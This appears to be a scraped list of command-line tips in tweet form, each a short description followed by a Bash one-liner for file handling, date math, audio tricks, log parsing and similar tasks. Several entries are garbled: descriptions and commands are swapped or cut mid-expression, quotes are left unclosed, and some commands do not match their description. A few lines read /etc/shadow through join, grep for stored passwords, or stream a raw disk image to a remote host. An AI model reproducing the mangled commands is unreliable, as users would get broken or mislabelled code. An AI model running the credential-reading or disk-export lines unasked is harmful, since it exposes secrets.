 fsck -y /dev/sda1 || echo "You\'re fscked!" | mail -s alert admin@x.com
```

- lasttweet

```Bash
 RT @msquadrat: allow the IP you're connecting from via SSH all access for two hours
```

- Find *.txt in $dir sorted by lines with $word By .@msquadrat

```Bash
 find "$dir" -name \'*.txt\' -print0|xargs -0 grep -FwiHc $word|sort -rn -t: -k2
```

- Sum instance counts by start set of non-zero numbers

```Bash
 gawk \'{gsub("0","",$1);a[$1]+=$2} END {for (p in a){print p " " a[p]}}\' resistors.txt
```

- Start a web service on port 8000. Among other things, it can be useful to testing LISTENing ports vs firewall

```Bash
 python -m SimpleHTTPServer
```

- Speak nicely

```Bash
 googlesay(){ curl -A RG translate\\.google\\.com/translate_tts -d "tl=en&q=$*" |mpg123 -; }; googlesay "I\'m tired of talking.
```

- Automatically installs your public key to the remote host (this is included in the openssh package)

```Bash
 ssh-copy-id 'user@remotehost'
```

- When you want to see output AND save it, try "| tee" of just a " >" redirect

```Bash
 rm -fv /somedir | tee remove.log
```

- On Linux, show the exact time/date the system was last booted

```Bash
 date -d @$(grep ^btime /proc/stat | cut -d" " -f 2)
```

- Use Perl regex to find cases of status: NOT followed by NOERROR in dig output files

```Bash
 zgrep -A100 -P "(?<= status: )(?!NOERROR)" 99.*.gz
```

- In vim, after using something like 'v' to select a range of lines, you can pass the range of lines through commands

```Bash
 :'<,' >!sort |column -t
```

- Find broken symlinks

```Bash
 find . -type l | (while read FN ; do test -e "$FN" || ls -ld "$FN"; done)
```

- Multiple choice music player.  Type the number of the song you want to hear

```Bash
 select mus in *.mp3 ; do mpg123 "$mus" ; done
```

- See http://t.co/CxXfZILQE7

```Bash
 echo $(( ( $( date -d '2031-06-28' +%s ) - $( date +%s ) ) / 86400 )) days until Tau day
```

- Happy Pi Day! (Run at 9:26:53am of course or just use date -d '2015-03-14 9:26:53.589793238')

```Bash
 date +%-m.%-d%y%-H%-M%-S%-N
```

- How many Friday the 13ths are there this year

```Bash
 printf "%d\\n" {1..12} | xargs -n1 -I{} date -d "2015-{}-13" | grep ^Fri
```

- Try catching a file that shows up temporarily in a queue

```Bash
 while true ; do cp -va *.dat /tmp/saveit/ 2 > /dev/null ; sleep 0.05 ; done
```

- How much space files older than the present year are using. %j=Julian day

```Bash
 find . -mtime +$(date +%j) -ls | awk '{sum+=$7} END {print sum}'
```

- Remove data dirs with specific length names older than 7 days

```Bash
 find /data -maxdepth 1 -type d -mtime +7 -name '20??????' -exec rm -vf {} +
```

- *facepalms*

```Bash
 rmdir mkdir
```

- First 80GB of sda to remote host w/ progress

```Bash
 dd if=/dev/sda bs=1G count=80 |pv -s80G |pbzip2 -c |ssh user@remote 'cat > /tmp/sda-80GB.bz2'
```

- A rainbow in your shell

```Bash
 yes "$(seq 231 -1 16)" | while read i; do printf "\\x1b[48;5;${i}m\\n"; sleep .02; done
```

- Another fun video trick. Mirror right side of video to left

```Bash
 mplayer --vf=geq='p(X\\,Y)*gt(W/2\\,X)+p(W-1-X\\,Y)*lt(W/2-1\\,X)' tv://
```

- Alternate dimension with your webcam. Kids love this

```Bash
 mplayer --vf=geq='128+(p(X\\,Y)-128)*8' tv://
```

- Generate a random ordered list of 20 numbers. For example to determine order of presentation

```Bash
 seq 20 | shuf
```

- [01].[01].[01]

```Bash
 convert -crop 150x750+100+150 dress.jpg txt: | grep "black|
```

- Listen to permissions

```Bash
 n=(C D E F G A B "C4 ");stat -c%a *|while read -n1 k;do x=${n[$k]};sleep .2;play -qn synth pl ${x}3 fade 0 1 & done
```

- Anyone else seeing this https://: problem?

```Bash
 curl -I https://archive\\.org/index.php | grep Location
```

- paste chk

```Bash
 pmd5(){ xsel -p|md5sum|cut -d\' \' -f1;}; while :;do if [[ "$l" != "$( pmd5 )" ]];then xsel -p;echo;l=$( pmd5 );fi ;sleep .25;done
```

- Never trust your own abilities to come up with a clever way of generating passwords. Swallow your ego and use pwgen instead

```Bash
 pwgen 12
```

- Counts files in the current path by modification month

```Bash
 find . -maxdepth 1 -type f -printf '%TY-%Tm\\n' | sort | uniq -c
```

- Find logs for auths under hosts dir and list them by last modified time

```Bash
 find hosts -name auth.log -o -name secure.log | xargs ls -ltra
```

- Do something special number of ssh processes > 20

```Bash
 while [[ $(pgrep -c -f "ssh " ) -le 20 ]]; do sleep 10; done; echo "There is a problem
```

- E-mail reformat dates

```Bash
 grep -r \'for <me@host >\' . |awk -F\\; \'{print $2}\'|while read -r date; do date -d "$date" +%Y-%m-%d ; done > dates-Ymd
```

- climagic video: Use comment characters in commands to add meta info to commands

```Bash
 http://t.co/k9WE4wZycs
```

- Mount set of partitions for recovery

```Bash
 for i in {1..12}; do mkdir /media/sdd$i &&mount -o ro /{dev,media}/sdd$i ||rmdir /media/sdd$i ; done
```

- Using GNU date you can specify a Unix epoch date with an @ in front and return the local time

```Bash
 date -d @1424242424
```

- Put this in your .bashrc so that on login it will list your tmux sessions. If none, don't show the error

```Bash
 tmux list-sessions 2 > /dev/null
```

- in .profile, lists screen sessions on login /c...

```Bash
 RT @schtobia: if [ -x `which screen` ]; then screen -q -ls; [ $? -ge 10 ] && screen -ls; fi
```

- Print out the first character of $val. The syntax is ${variable:start:length}. Omitting length value gives rest of string

```Bash
 echo ${val:0:1}
```

- 1} -eq 1 ] && arg="Lit_$1" ||arg=$1; curl -d '' "http://roku\\.yournetwork:8060/keypress/$arg"; }

```Bash
 roku(){ [ ${
```

- climagic. Its a great place for discussing command line tricks

```Bash
 There is also an official IRC channel for climagic on http://t.co/8Ef508iK89
```

- Columns with data

```Bash
 for i in {1..161}; do printf "$i "; awk -F, \'NR >1{print $\'$i\'}\' weather.csv |uniq -c |wc -l; done |awk \'$2 >1{print $1}\'
```

- Make a function to shorten this commonly used command line pattern & allow for options for final sort

```Bash
 sus(){ sort | uniq -c | sort $@; }
```

- GNU grep supports perl regex expressions. This gives only the PID on CRON lines in syslog

```Bash
 grep -o -P "(?<=CRON\\[)\\d+" /var/log/syslog
```

- "Last" Received: line of each msg

```Bash
 find .spam/ -type f -exec sed -n -e \'/^Received:/{h}\' -e \'/^$/{x;p;q}\' {} \\; > initial-received
```

- Quick access to the ASCII character table via the ascii program or the man page if you don't have the prog. @mshindal

```Bash
 ascii || man ascii
```

- Find incomplete years in data

```Bash
 awk -F, '/USC00120784/{print substr($6,0,4)}' weather.csv |uniq -c |awk '$2%4==0&&$1<366||$2%4!=0&&$1<365'
```

- Mount the root filesystem to an alternate path in Linux to access "hidden" files underneath logical mountpoints

```Bash
 mount -o bind / /mnt/root
```

- Run this if you want to send your children off in the world to be on their own. I'm talking about processes of course

```Bash
 disown -a
```

- Get a random line from a file. sort -R will also do this

```Bash
 shuf -n1 quotes.txt
```

- In vim, when you want to paste in text, this will prevent autoindent/autosyntax doesn't interfere. :set nopaste to turn off

```Bash
 :set paste
```

- Linux full ps output, sorting process table by memory usage in descending order (- before rss)

```Bash
 ps auxw --sort -rss
```

- Show the process in a tree format, search for gzip and show 8 lines of pre-match context to see its family

```Bash
 ps auxwwf | grep -B8 "[g]zip
```

- Play music for 60 minutes and then shutdown. Like sleep on alarm clock

```Bash
 sudo shutdown -h 60 & mpg123 ambientmusic/*.mp3
```

- In Linux, find running dd processes and send them a signal to print out their progress. For @Erstejahre

```Bash
 kill -USR1 $( pidof dd )
```

- Happy Groundhog Day!

```Bash
 [ -f /etc/shadow ]&&while :;do N=$(($RANDOM%$(tput cols)));for i in $(seq 1 $N);do echo -n " ";done;echo \\*;done
```

- climagic video: The epic demo of how I watched Superbowl 46 using the command line

```Bash
 http://t.co/dL1fKj9Npw
```

- On Debian, find out which non-installed package provides a file. Need to install apt-file package first

```Bash
 apt-file search /usr/bin/apxs2
```

- When adding "bar" to project, which files contain foo but not bar? Thx @CoolSWEng

```Bash
 comm -23 <(grep -rl foo . |sort) <(grep -rl bar . |sort)
```

- Show photo filenames where no flash was used. Req. Imagemagick

```Bash
 identify -format "%f F:%[EXIF:Flash]\\n" *.jpg | egrep " F:(0|16|24|32)$
```

- Search for something in CWD and below and then order those matching files by time

```Bash
 grep -lrZ password . | xargs -0 ls -lt
```

- Find eval( lines in PHP files in user's www subdirectory trees

```Bash
 find /home/*/www -name "*.php" -exec grep --color -H -n \'eval(\' {} +
```

- Listen to the last 20 seconds of a long voicemail that has the contact phone at the end

```Bash
 play msg0493.WAV trim -20
```

- Today's famous birthdays

```Bash
 elinks -no-numbering -dump-width $COLUMNS $(date +enwp\\.org/%B_%-d)|sed '/Birth/,/Death/!d'|grep \\*
```

- Use brace expansion to copy range of images (IMG_1050.JPG through IMG_1622.JPG) to usb drive

```Bash
 cp -va IMG_{1050..1622}.JPG /media/usbdrive/
```

- Use rev twice to get around limitation of cut not being able to truncate end of a string

```Bash
 echo test | rev | cut -c 2- | rev
```

- Print different parts of two different lines and join them

```Bash
 awk \'/date/{print $4 " " $5} /src_ip/{print $3}\' alerts.mbox | xargs -n3
```

- Play pink noise for thirty hours. Thx @hackedy

```Bash
 play -t sl - synth 30:00:00 pinknoise band -n 1200 200 tremolo 20 .1 </dev/zero
```

- Download images in sequence IMG_0001.JPG through IMG_0100.JPG

```Bash
 curl --remote-name http://www.example\\.com/images/IMG_[0001-0100].JPG
```

- A "stronger" version of Ctrl-C. It sends a SIGQUIT, which will kill most programs. Some still trap it. kill -9 is even "stronger"

```Bash
 [Ctrl-\\]
```

- Set the search jump target to 10 lines down so that you see 9 previous lines of context on searches within less

```Bash
 less -j10 /var/log/syslog
```

- Some DNS ASCII ART by @dblockdotorg

```Bash
 dig +short naptr http://t.co/58MsxFQIoD @8.8.8.8 | sort
```

- Find all files larger than 100MB and display their human readable size

```Bash
 find / -size +100M -exec ls -sh {} \\;
```

- 2015 is a binary palindrome

```Bash
 for i in {2048..1024};do b=$(echo "ibase=10;obase=2;$i"|bc);[[ $b == $(rev < $b) ]]&&echo $i $b;done
```

- Play an ASCII art animation via pv command for speed control

```Bash
 curl -s climagic\\.org/ascii/climagic8000.vt | pv -q -L9600
```

- gzip files in the current directory that are more than 60 days old

```Bash
 find . -maxdepth 1 -type f -mtime +60 -exec gzip -v9 {} \\;
```

- Pipe into first command available

```Bash
 time echo "Happy Birthday Stephen Hawking" | ( Equalizer || espeak || say -v Fred || cat )
```

- anim

```Bash
 convert -pointsize 72 label:'01011' -duplicate 50 -virtual-pixel tile -distort SRT '0,0 1,0,%[fx:w*t/n],%[fx:h]' -loop 0 binary.gif
```

- Takes you back to the previous branch you were in. Thx @shawndumas

```Bash
 git checkout -
```

- Use regex character classes to find 4 letter words that work in ipv6 segs. l=1, o=0, s=5

```Bash
 egrep -e "^[a-flos]{4}$" /usr/share/dict/words
```

- Takes you back to the previous directory you were in. Good to know if you don't already

```Bash
 cd -
```

- print difference between the last and first row in 5th column

```Bash
 awk '{if (!first){first=$5;}; last=$5;} END {print last-first}' stats.log
```

- Use your webcam and mplayer as a mirror with this function

```Bash
 mirror(){ mplayer -vf mirror -v tv:// -tv device=/dev/video0:driver=v4l2; }
```

- Find the longest line in quotes.txt

```Bash
 awk 'length > max { max=length;maxline=$0 } END { print maxline; }' quotes.txt
```

- Print the factors of 2015. Happy New Year!

```Bash
 seq $((2015/2)) | awk '2015%$0==0'
```

- Happy 30th Anniversary Free Software Foundation in 2015. Inspiring video

```Bash
 https://t.co/Po0nUSbALT
```

- Using +F option or pressing F in less is similar to `tail -f filename.log` but you can use less's features

```Bash
 less +F filename.log
```

- Find 10 most freq words in file

```Bash
 cat mybook.txt|tr -s '[:space:]' '\\n' |tr '[:upper:]' '[:lower:]'|sort|uniq -c|sort -nr|head -10
```

- Search the file system, but don't descend into the /sys or /proc directories

```Bash
 find / \\( -path /proc -o -path /sys \\) -prune -o -print
```

- 5 second per screensaver visual preview

```Bash
 for i in /usr/lib/xscreensaver/i* ; do echo "This one is $i" ; $i & sleep 5 ; kill %% ; done
```

- Snow in your terminal

```Bash
 http://t.co/m7Sm2V34YW
```

- Make dated directories for next 100 days. Use date -v+{}d on BSD

```Bash
 seq 100 | xargs -n1 -I{} date -d "+{} days" +%Y%m%d | xargs mkdir
```

- Thx @asociale

```Bash
 googlesay(){ curl -A RG translate\\.google\\.com/translate_tts -d "tl=en&q=$@" |mpg123 -; }; googlesay "I\'m tired of talking.
```

- JB

```Bash
 curl climagic\\.org/txt/jb.txt|while read -r c n l;do printf "\\e[1;${c}m%${COLUMNS}s\\e[0m\\n" " ";play -q -n synth pl $n trim 0 $l;done
```

- Space usage of directories only (This was the first climagic command posted from December 15th, 2009)

```Bash
 du -sh */
```

- Birthday of the late Mike Muuss, creator of ping & default routes

```Bash
 ping -c$[2000-1958] $(ip route |awk '/default/{print $3}')
```

- Check for Poodle vuln

```Bash
 nmap --script ssl-enum-ciphers -p 443 twitter\\.com |grep "SSLv3: No supported" ||echo "Site vulnerable to poodle
```

- The correct image in a lossless format

```Bash
 identify -format %k http://t.co/cDn4PW1TEO
```

- Count unique colors in an image. Not 1,000,000 as advertised. Thx @lorddrachenblut

```Bash
 identify -format %k http://t.co/Aqy4qFfay7
```

- Dec 10 = Oct 12 They should use October 12th for Ada Lovelace day

```Bash
 printf "ibase=10;obase=8;10\\n" | bc
```

- Log start and ending timestamps of a long running job

```Bash
 date +"Start: %c" > timestamps ; runsomething ; date +"Ended: %c" > > timestamps
```

- Overhead projectors are dangerous IT equipment. They should put warnings on them

```Bash
 Username: 7p3VMO01RzeS
```

- More cool visuals you can make in your terminal with your cursor

```Bash
 http://t.co/ammutuorZG
```

- 1000 factorial using brace expansion. Remember to backslash * or else it will act as wildcard

```Bash
 echo {1000..2}\\* 1 | bc
```

- Sometimes I think the purpose of this directory is to serve as advertising to the rest of the Unix world

```Bash
 rm -fr __MACOSX
```

- @CarlaSchroder has written a nice article inspired by some recent "Fun Friday" climagic tweets

```Bash
 http://t.co/TOiGQzwqZm
```

- New CLIMAGIC video: Joining files together using the join command

```Bash
 https://t.co/9vPDDXtmPm
```

- This is an easy way to join a file into one line if you're in a hurry. Be careful with really long data though

```Bash
 xargs < file.txt
```

- For apache, this may be a good sort command to pass the previous command through

```Bash
 | sort -t' ' -k4.5,4.7M -k4.2,4.3n -k4.14,4.21
```

- Shellshock attempts

```Bash
 find . \\( -name \'*-access_log.1\' -o -name \'*-access_log\' \\) -execdir grep --color=always -HE \'\\(.*\\).*\\{.*\\}.*"\' {} +
```

- Learn about the power of the lsof command.  Thx @INDIVIDUALIT

```Bash
 http://t.co/yh82QeqmDD
```

- Find out the name of the Debian package that contains the program VirtualBox (when you execute it w/o path)

```Bash
 dpkg -S $( which VirtualBox )
```

- In vim, depending on whether your terminal background is dark or light, setting this will help with color syntax

```Bash
 :set background=dark
```

- If you have a big file to copy, use pv instead of cp. pv gives you progress and speed. Thx @i4AK

```Bash
 pv /oldfolder/file > /newfolder/file
```

- upgrades

```Bash
 Do you want to also install these other packages that will break everything else? [Y/y]
```

- Handy command to help you decide if you should panic by @jschauma. Thx IgorBrigadir

```Bash
 host -t txt http://t.co/6OGgztZg93
```

- New CLIMAGIC video: The Star Wars Reverse DNS command

```Bash
 https://t.co/2pOHWasKwn
```

- Show when temp changes > 1. (sqrt(n*n) is equivalent to absolute value)

```Bash
 awk '{n=$1-lc;if (sqrt(n*n) >1) { print; lc=$1; }}' temp.log
```

- Print out packages with 3.11.0 in them and expand the first column (name) so its fully readable

```Bash
 dpkg -l '*3.11.0*' | cut -c1-$COLUMNS
```

- Calculate how many days old you are. Uses GNU syntax

```Bash
 echo $(( $(( $( date +%s ) - $( date -d "1989-11-29" +%s ) )) / 86400 ))
```

- Star Wars Episode IV in Reverse DNS

```Bash
 ( seq 1 8 200 ; seq 6 8 200 ) | sort -n | xargs -I{} -n 1 dig +short -x 206.214.251.{}
```

- Generate 0 through 255 directories with 0 through 255 subdirectories inside each in one command

```Bash
 mkdir -p {0..255}/{0..255}
```

- Emoticon prompt for BASH shows return status as emoticon

```Bash
 PS1=\':$( [ $? == 0 ] && echo ") " || echo "( " )\'
```

- ] and, presto!, all comments are gone. Thx @m_strehl

```Bash
 Skimming through config files got so much better right now: In less(1) enter &^[^
```

- xkcd

```Bash
 So hopefully you\'ll be able to defuse the "tar bomb" if you ever are in that situation. Sorry BSD users but you are goners. ;-)
```

- If you didn't know, GNU tar now auto-detects the compression algorithm you need. No option required

```Bash
 tar xvf archive.tar.bz2
```

- Function to draw a dividing line in a terminal. Thx @Fluffkin

```Bash
 separator(){ printf '%*s\\n' $(tput cols) '' | tr ' ' -; }
```

- Fix a typo in the previous command. :-(

```Bash
 !!:s/right/rite/
```

- This used to be a right of passage for most Linux users. Today few recognize it

```Bash
 make config && make dep && make zImage
```

- I have to admit, this spam subject did make me run "look f | egrep ^f..k$"

```Bash
 Subject: F**k binary
```

- Merge files together based on fields. -o specifies output format

```Bash
 join -o 1.1,2.2,1.3,1.4,1.5,1.6,1.7 -1 1 -2 1 -t: passwd shadow
```

- jpegtran also rotates images, but without quality loss like IM convert. Thx @kaihendry

```Bash
 jpegtran -rotate 90 -outfile rot90.jpg image.jpg
```

- Run sudo on the last command in your history. be careful because this can bite you. <Up Arrow > & [Ctrl-a] is just as fast

```Bash
 sudo !!
```

- Alert me when ping desktop fails. Quick diagnostics

```Bash
 while ping -c 1 desktop; do sleep 10; done; xmessage "Desktop unreachable at $(date)
```

- whoops

```Bash
 Hostnames, they are important.
```

- Add header by using "pee"(included in moreutils)

```Bash
 RT @Heliac1999: df -Ph | pee "head -n 1" "tail -n+2 | sort -k5nr
```

- Start on the second line (-n+2) of output and sort by 5th column numerically descending. Thx @chenghlee

```Bash
 df -Ph | tail -n+2 | sort -k5nr
```

- Show the processes of user 'someuser' in long form. Thx @clodoco

```Bash
 ps wu -U someuser
```

- Organize files by month modified

```Bash
 find . -maxdepth 1 -printf "%TB %f\\n" | while read -r month file ; do mv -v "$file" $month/ ; done
```

- su tux -c xeyes\nX11 ... wrong authentication.\n

```Bash
 RT @mvidner:
```

- ShowMeTheText

```Bash
 Website slow? Try using elinks.
```

- You can use the strings command on binary data to see the readable portions of it. I use this all the time

```Bash
 strings imagefile.jpg
```

- Pandora music client for the command line. And like many CLI clients, it has more control, features and less bloat

```Bash
 pianobar
```

- CLIMagic variety show

```Bash
 http://t.co/6l8YD8d7BN
```

- Quick ref alias

```Bash
 alias what_are_those_damn_conditional_expressions="man bash | sed -n \'/^CONDITIONAL EXPRESSIONS/,/^SIMPLE COMMAND/p\'
```

- Just a quick and dirty way to list interface names and just their TX/RX byte lines

```Bash
 ifconfig | grep -oE -e "^[^\\ ]+" -e ".*bytes.*
```

- If you are in a directory path containing symlinks, this will put you into the physical directory path that the symlinks point to

```Bash
 cd -P .
```

- Auto mouse scroll up in X for 30 seconds. Helps with http://t.co/s52TZ2T9Lr

```Bash
 sleep 5; xdotool click --repeat 1500 --delay 20 4
```

- In case you didn't know, pipe output to less so you can limit output to a page at a time. -S will prevent wrapped lines

```Bash
 ls -l | less -S
```

- Print "columns" 5 and 11 through the end of line. Throw the rest away

```Bash
 find . -ls | awk \'{$1=$2=$3=$4=$6=$7=$8=$9=$10=""; print $0}\'
```

- If you use mutt, this can be a useful command to pipe an e-mail into to check for malicious domains in URLs

```Bash
 egrep -o https?://[^/]*/
```

- reptyr can be used to reattach a program on another tty to the current tty so you can transfer it into screen/tmux. Thx @d3m0n35

```Bash
 reptyr
```

- Using a trap, increment $a by 1 through a USR1 signal. Then do kill -USR1 PIDOFBASH to do it

```Bash
 trap 'a=$((++a)); echo a is now $a' SIGUSR1
```

- You started a program, but now want it to notify you when its done

```Bash
 <ctrl-z > bg ; wait %1 ; echo "done" | mail -s "done" you@example.com
```

- A logical && after sleep gives a chance to "Ctrl-C" out w/o it running the other command if you "chicken out"

```Bash
 sleep 1m && shutdown -h 0
```

- By @stackpivot

```Bash
 perl -e 'use bytes; for($t=0;;$t++){ print chr($t*(($t > >11|$t > >23)&53&$t > >3)); }'  |play -t raw -b8 -r8k -e un -
```

- Go to random site using up to 12 letter word from dictionary

```Bash
 elinks http://www.$( look . | grep -E "^[a-z]{,12}" | shuf | head -n 1 ).com
```

- Show what files or filehandles are open in the /tmp directory (if its not a seperate partition). This can be slow

```Bash
 lsof +D /tmp
```

- Make sure all photos in current directory have been backed up

```Bash
 for i in *.JPG; do ls -l /multimedia/photos/family/$i ; done > /dev/null
```

- Reverse DNS for list of IPs

```Bash
 sort -u -t. -k1n,1 -k2n,2 -k3n,3 -k4n,4 |while read -r ip; do r=$( dig +short -x $ip ); echo "$ip - > $r"; done
```

- Wait for a wget download to finish then shutdown the computer

```Bash
 while pgrep wget ; do sleep 5 ; done ; shutdown -h now
```

- Remember doing this?

```Bash
 while true; do echo $((++n)); done
```

- Math music by viznut

```Bash
 perl -e 'use bytes; for($t=0;;$t++){ print chr($t*(($t > >12|$t > >8)&63&$t > >4)); }' | play -t raw -b8 -r8k -e un -
```

- Long list only the normal files (not directories, etc) in the current directory in last modified order

```Bash
 ls -ltrah | grep -E '^-'
```

- Show the total space used on all your local disk partitions

```Bash
 df -lkP | awk \'{sum += $3} END { printf "%d GiB\\n", sum/(2**20) }\'
```

- Simple meal location decider function

```Bash
 eatwhat(){ echo "Tacos,Burgers,Pizza,Sushi,Salad,Pasta" | tr \',\' \'\\n\' | sort -R | head -1; }
```

- Convert image to color

```Bash
 jp2a -b --colors --fill http://t.co/JyYyscVdAZ
```

- ASCII art stereogram generated using aa3d. Focus past the text on the screen

```Bash
 http://t.co/ZPhxSZiTv5
```

- less often tries to interpret known extensions using lesspipe. If you want to avoid that and see raw data, try this method

```Bash
 less < van.doc
```

- Top 50 404's in descending order

```Bash
 zcat access_log*.gz | cat access_log - | awk \'$9 == "404" {print $7}\' |sort|uniq -c|sort -rn| head -n 50
```

- ferguson |grep --line-buffered -P "^\\s+@" |while read l; do date +%H:%M;done|uniq -c

```Bash
 t stream search \\
```

- Rainbowstream is another CLI twitter client that is colorful and allows in-terminal image viewing. Thanks @dtvd88

```Bash
 http://t.co/w1eKfgGmQO
```

- Long time follower @jeroenhjanssens is giving a webcast today at 1pm EST on data science at the command line

```Bash
 http://t.co/0NdptnKISb
```

- rig is this cool little program that generates random identities and is nice for testing forms

```Bash
 rig
```

- Using brace expansion to make it quicker to specify args when the tarfile and directory name are same base

```Bash
 tar zcvf directory{.tar.gz,}
```

- An answer on this site provides an interesting solution for coloring multiple tail outputs. Thx @DanFromGermany

```Bash
 http://t.co/bRjaRfrcIm
```

- script is a nice program that allows you to record your interactive shell session. Great for logging upgrades

```Bash
 script shellsession.log
```

- hacktheplanet

```Bash
 Grand Central Station!
```

- tail syslog continuously and add extra newline, which may help with readability when lines are long

```Bash
 tail -f syslog |awk \'{print $0 "\\n"}\'
```

- In ZSH, you can press Meta + h to display the man page of the command to the left of the cursor. Thx @_dhamidi

```Bash
 [Meta-h]
```

- Show usage of files/directories, sorted by the human readable size. -h is available with newer versions of sort

```Bash
 du -sh * |sort -h
```

- This is how my day has been

```Bash
 play -n synth sine 480 sine 620 remix 1-2 fade 0 0.5 delay 0.5 repeat 5
```

- @sehetw likes to use the -w option, which ignores all whitespace-only changes between files

```Bash
 diff -w file-with-crlf.dos file-with-lf.txt
```

- Quickly navigate your filesystem using a couple of functions. Thx @kidpixo

```Bash
 http://t.co/Xw8iJ5XWRD
```

- Show what is different between two directories containing plugin code

```Bash
 diff -uNr plugin-orig plugin-current | less
```

- Even though my complaint is about it being the default everywhere, you can use the output of this program to set the color

```Bash
 dircolors
```

- 4 RPG fans

```Bash
 d20kill(){ n=$(($RANDOM%20+1));case $n in 20)kill -9 $1;echo 'Critical hit!';;1[0-9])kill $1;echo 'Hit';;*)echo 'Miss';;esac; }
```

- Roll a digital 6 sided die. Thx @marissa_rae

```Bash
 echo $(($RANDOM % 6 + 1))
```

- Quickly see what day of the week some date this year is on, just use a -v for each part of the date in BSD date

```Bash
 date -v Nov -v 15d
```

- Quickly see what day of the week some date this year is on, you can just use date -d "short date" in GNU date

```Bash
 date -d "Nov 15
```

- Watch ESSID's in your area every 5 seconds including count at the end

```Bash
 watch -n 5 "iwlist wlan0 scan | grep ESSID | pee cat \'wc -l\'
```

- Old term is new term. Thx @JCaesar (love your cipher and your salad)

```Bash
 http://t.co/dpX3TFgFet
```

- .*//' manifests/nodes.pp|egrep -o '\\$\\w+') modules|sort -t: -k2 |uniq

```Bash
 fgrep -roH -f<(sed 's/
```

- Look up a definition for the word autonomy in a few online sources. You probably need to install dict for this

```Bash
 dict minging
```

- Set your keyboard repeat rate under X windows to 220 ms delay before repeat and 60 cps. YMMV

```Bash
 xset r rate 220 60
```

- UTF8 sanitize. Thx @mvidner

```Bash
 iconv -f utf8 -t utf8//ignore < mostly_utf8_with_some_invalid_characters > utf8_offending_characters_removed
```

- Happy 15th System Administrator Day! I bring you the epic tale of The Stick!

```Bash
 http://t.co/daCwGTySxI
```

- In vim, this search will find non-ascii characters and things like invisible space characters generated by "friendly" apps

```Bash
 /[\\x80-\\xff]
```

- In OS X, send the base64 data in your copy/paste buffer into base64 for decoding

```Bash
 pbpaste | base64 -D
```

- In X windows, send the base64 data in your copy/paste buffer into base64 for decoding

```Bash
 xsel -b | base64 -d
```

- AT&T telephone building moved in 1930 during working hours

```Bash
 http://t.co/oi1LzJUJBu
```

- xiki

```Bash
 All those new options and syntaxes should keep climagic going for years.
```

- Show SMTP transaction to see if e-mail is valid

```Bash
 swaks --to cancelation@comcast\\.net --server mx1.comcast\\.com --quit-after RCPT
```

- The ascii command also allows you to convert ascii text into the various numeric bases

```Bash
 ascii -s "show me the codes" | column -t
```

- Quick access to the ASCII character table either through the ascii program or the man page if you don't have the prog

```Bash
 ascii || man ascii
```

- Here is a short list of other useful readline keystrokes you can use in bash. Thx @komidore64

```Bash
 http://t.co/DOyeGUlLSN
```

- Find files under the current directory tree that have a space in the filename

```Bash
 find . -name '*\\ *'
```

- Test your shell-fu in a "wargame" environment. Many climagic tricks can be used here

```Bash
 http://t.co/GMu32WGJCl
```

- joke

```Bash
 Kellogg's is tightening up its cybersecurity because they have lots of old serial connections. They're also worried about air gaps.
```

- Instead of using sleep 60, you can use read and "short-circuit" the wait with a return. Thx @jpluscplusm

```Bash
 while :; do read -st 60 X ; done
```

- Remove the previous word on the command line (before the cursor). This is highly useful when reusing old commands

```Bash
 <Ctrl-w >
```

- This is usually equivilent to running 'clear'.  Its usually quicker and doesn't leave the command in your command line history

```Bash
 <Ctrl-l >
```

- Manual lists this as Ctrl-_ but Ctrl-- usually works too. Incremental undo of command line edits

```Bash
 <Ctrl-- >
```

-  >

```Bash
 <Meta-
```

- Insert the last argument from the previous line in the command history into the current line. Different from !$

```Bash
 <Meta-. >
```

- Move your cursor to the end of the line. Faster than holding down right arrow

```Bash
 <Ctrl-e >
```

- Move your cursor to the beginning of the line. Faster than holding down left arrow. In screen, you need to press <Ctrl-a a >

```Bash
 <Ctrl-a >
```

- Reverse search through your command history for 'string'. Press Ctrl-r again to continue searching backwards. ESC when done

```Bash
 <Ctrl-r >string
```

- Takes you back to the previous directory you were in. Good to know if you don't already

```Bash
 cd -
```

- (With no arguments) Takes you back to your home directory

```Bash
 cd
```

- description. The

```Bash
 Just a reminder about the format of climagic tweets: command
```

- Kinda philosophical. What is a line of text really? (Disclaimer: I know the manpage does say "newline" count)

```Bash
 printf "hello" | wc -l
```

- space per user

```Bash
 getent passwd|while IFS=: read -r user n uid n n home n;do if [[ $uid -ge 500 ]];then printf "$user ";du -sh $home;fi;done
```

- Redirect "external" port 3000 from your router to port 3000 of 192.168.1.100. Thx @ntnmrndn

```Bash
 upnpc -a 192.168.1.100 3000 3000 tcp
```

- Show 5 lines of context output after every match of any div tag in index.html

```Bash
 grep -A5 '<div' index.html
```

- More fireworks! GUI output, but many CLI options. You need the rss-glx screensavers package

```Bash
 /usr/lib/xscreensaver/skyrocket
```

- Virtual fireworks noises (WARNING: screamer)

```Bash
 play -n synth sine 8000 bend 0.5,-1800,5 flanger 0 3 0 20 10 tri 20 quad trim 0 7
```

- Bottle rocket sound

```Bash
 play -n synth whitenoise 200 fade 0.2 1 1 trim 0 0.5 ; sleep 1 ; play -n synth whitenoise 200 fade 0 1 1 trim 0 1
```

- Right, that was overkill. I forget that the default function of uniq is to just print out the unique lines. Duh!

```Bash
 uniq data.txt
```

- Print the lines that only occur once in data.txt

```Bash
 sort data.txt | uniq -c | grep "^\\ *1
```

- Maybe find file/dirs in an unreadable /tmp dir

```Bash
 look .| egrep "^[a-z]{1,5}$" |while read word; do [ -e /tmp/$word ] && echo $word ; done
```

- Print the last field of every other line in the file data.txt. Use NR%2==1 for the "other" line

```Bash
 awk \'(NR%2==0) { print $NF }\' data.txt
```

- update Mac OSX on command line Thx @qtfimik

```Bash
 softwareupdate -iav
```

- How I feel after I switch over to a new router at home and finally get it connected

```Bash
 http://t.co/Ih1qrFr16b
```

- Find out what Linux distro you are using

```Bash
 lsb_release -a || echo "Its probably Red Hat based.
```

- Use brace expansion to copy range of images (IMG_1050.JPG through IMG_1622.JPG) to usb drive

```Bash
 cp -va IMG_{1050..1622}.JPG /media/usbdrive/
```

- Convert something typed in qwerty layout on a dvorak layout. ;-)

```Bash
 tr "qwertyuiop[]sdfghjkl;\'zxcvbnm,./" "\',.pyfgcrl/=oeuidhtns\\-;qjkxbmwvz
```

- sudo makecoffee works too. But /sbin/printf is "more powerful" so be careful

```Bash
 alias makecoffee=\'printf "\\xE2\\x98\\x95\\n"\'
```

- "}; print $0 " " b;}

```Bash
 awk \'{print $4}\' apache_log|sort -n|cut -c1-15|uniq -c|awk \'{b="";for(i=0;i<$1/10;i++){b=b
```

- Quickly give yourself an Unix time epoch value 1 year from now. Use date -v+1y +%s on Mac/BSD date

```Bash
 date -d "now + 1 year" +%s
```

